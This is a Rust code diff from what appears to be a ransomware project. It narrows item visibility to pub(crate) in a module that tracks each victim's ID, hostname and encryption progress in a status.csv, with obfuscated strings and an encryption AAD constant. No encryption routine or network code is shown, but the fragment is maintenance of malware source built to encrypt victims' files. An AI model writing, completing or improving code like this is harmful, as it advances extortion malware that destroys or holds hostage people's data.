@@ -13,7 +13,7 @@ use serde::{Deserialize, Serialize};
 use tracing::{debug, error, info};
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
-pub struct Status {
+pub(crate) struct Status {
     #[serde(default)]
     pub id: VictimId,
     #[serde(default)]
@@ -33,7 +33,7 @@ pub struct Status {
 }
 
 #[derive(Serialize, Deserialize, Clone, Copy, Debug, Default, PartialEq, Eq)]
-pub enum EncryptionState {
+pub(crate) enum EncryptionState {
     #[default]
     NotStarted,
     Started,
@@ -42,22 +42,22 @@ pub enum EncryptionState {
 
 impl EncryptionState {
     #[must_use]
-    pub const fn is_started(self) -> bool {
+    pub(crate) const fn is_started(self) -> bool {
         matches!(self, Self::Started)
     }
 
     #[must_use]
-    pub const fn is_complete(self) -> bool {
+    pub(crate) const fn is_complete(self) -> bool {
         matches!(self, Self::Complete)
     }
 }
 
-pub static STATUS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("status.csv"));
-pub static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));
+pub(crate) static STATUS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("status.csv"));
+pub(crate) static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));
 
-pub const ENCRYPTION_AAD: &str = "Cartier and Tiffany";
+pub(crate) const ENCRYPTION_AAD: &str = "Cartier and Tiffany";
 
-pub fn import_status_csv(path: &Path) -> anyhow::Result<Option<Status>> {
+pub(crate) fn import_status_csv(path: &Path) -> anyhow::Result<Option<Status>> {
     let file = match File::open(path.join(&*STATUS_FILENAME)) {
         Ok(file) => {
             info!(?file, "Existing CSV file found");
@@ -85,7 +85,7 @@ pub fn import_status_csv(path: &Path) -> anyhow::Result<Option<Status>> {
     Ok(Some(status))
 }
 
-pub fn export_status_csv(path: &Path, status: &Status) -> anyhow::Result<()> {
+pub(crate) fn export_status_csv(path: &Path, status: &Status) -> anyhow::Result<()> {
     let status_file_path = path.join(&*STATUS_FILENAME);
     let temp_file_path = path.join(format!("{}.tmp", *STATUS_FILENAME));
 
@@ -101,7 +101,7 @@ pub fn export_status_csv(path: &Path, status: &Status) -> anyhow::Result<()> {
     Ok(())
 }
 
-pub fn create_status() -> Status {
+pub(crate) fn create_status() -> Status {
     let status = Status {
         id: VictimId::new(generate_id()),
         hostname: current_hostname(),
